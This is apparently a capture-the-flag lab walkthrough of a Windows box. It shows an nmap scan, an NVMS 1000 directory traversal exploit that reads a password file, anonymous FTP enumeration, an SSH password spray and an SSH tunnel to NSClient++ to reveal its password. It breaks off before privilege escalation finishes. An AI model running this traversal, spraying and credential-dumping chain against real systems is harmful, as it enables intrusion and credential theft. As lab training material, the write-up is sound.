Nmap scan details

udo nmap -p- -sC -sV 10.129.227.77 -T4 --min-rate=1000 -Pn --open -oN nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-30 05:06 EDT
Nmap scan report for 10.129.227.77
Host is up (0.26s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     9G2aOv0l52qCev
|     workers
|_    jobs
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

there is web app running on this > http://10.129.227.77/Pages/login.htm
showing a servies name called NVMS1000


there is a "NVMS 1000 - Directory Traversal - Hardware webapps Exploit"

Python3 nvms.py 10.129.227.77 Windows/system.ini 
[+] DT Attack Succeeded
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

++++++++++  END  ++++++++++


connected to the FTP to see any leaked data 

ftp 10.129.227.77
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49679|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp>

we can see the two users listed saving them 

tp> cd nadine
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49680|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> cat Confidential.txt
?Invalid command.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
229 Entering Extended Passive Mode (|||49681|)
150 Opening ASCII mode data connection.
100% |*************************************************************************************************************************************************|   168        0.63 KiB/s    00:00 ETA
226 Transfer complete.


reading the Confidential.txt 

Found this message "cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
"
we already know that there is a NVMS 1000 directory traversal attack using it to get the password.txt 

python3 nvms.py 10.129.227.77 users/Nathan/Desktop/Passwords.txt password.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++

nxc ssh 10.129.227.77 -u users.txt -p password.txt 

SSH         10.129.227.77   22     10.129.227.77    [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.227.77   22     10.129.227.77    [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [-] Nathan:B3WithM30r4ga1n5tMe
SSH         10.129.227.77   22     10.129.227.77    [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!

Got the access 

privilage esclation ran the winpease.exe

found soome intteranl services are running 

which we done the nmap scan we found that there is ahttp running on 8443 port with the "NSClient++" on it 

done port forwarding using the ssh 

ssh -L 8443:127.0.0.1:8443 Nadine@10.129.227.77

found the runninh web application on 127.0.0.1:8443 and there is a forgetpassword option where i can see 
these options 



C:\Program Files\NSClient++>nscp.exe web -- password --display   
Current password: ew2x6SsGTxjRwXOT
